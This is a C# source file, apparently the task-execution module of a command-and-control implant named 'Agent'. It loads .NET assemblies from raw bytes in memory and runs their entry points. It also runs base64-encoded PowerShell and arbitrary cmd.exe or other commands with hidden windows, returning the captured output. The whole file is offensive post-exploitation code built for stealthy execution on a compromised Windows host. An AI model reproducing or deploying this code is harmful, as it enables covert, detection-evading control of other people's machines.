using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;

namespace Agent
{
    class Exec
    {
        public static string ExecuteAssembly(byte[] asmBytes, string[] args)
        {
            var stdout = Console.Out;
            var stderr = Console.Error;

            try
            {
                var outWrite = new StringWriter();
                var errWrite = new StringWriter();

                Console.SetOut(outWrite);
                Console.SetError(errWrite);

                var asm = Assembly.Load(asmBytes);
                asm.EntryPoint.Invoke(null, new object[] { args });

                Console.Out.Flush();
                Console.Error.Flush();

                var result = new StringBuilder();
                result.Append(outWrite.ToString());
                result.Append(errWrite.ToString());

                return result.ToString();
            }
            finally
            {
                Console.SetOut(stdout);
                Console.SetError(stderr);
            }
        }

        public static string ExecutePowerShell(string args)
        {
            var enc = Convert.ToBase64String(Encoding.Unicode.GetBytes(args.ToString()));

            var cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    Arguments = string.Format("-enc {0}", enc),
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            cmd.Start();

            var stdout = cmd.StandardOutput.ReadToEnd();
            var stderr = cmd.StandardError.ReadToEnd();

            var result = new StringBuilder();
            result.Append(stdout);
            result.Append(stderr);

            return result.ToString();
        }

        public static string ExecuteCommand(string command, string args)
        {
            var cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            cmd.Start();

            var stdout = cmd.StandardOutput.ReadToEnd();
            var stderr = cmd.StandardError.ReadToEnd();

            var result = new StringBuilder();
            result.Append(stdout);
            result.Append(stderr);

            return result.ToString();
        }

        public static string ExecuteShellCommand(string args)
        {
            var cmd = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"C:\Windows\System32\cmd.exe",
                    Arguments = string.Format("/c {0}", args),
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            cmd.Start();

            var stdout = cmd.StandardOutput.ReadToEnd();
            var stderr = cmd.StandardError.ReadToEnd();

            var result = new StringBuilder();
            result.Append(stdout);
            result.Append(stderr);

            return result.ToString();
        }
    }
}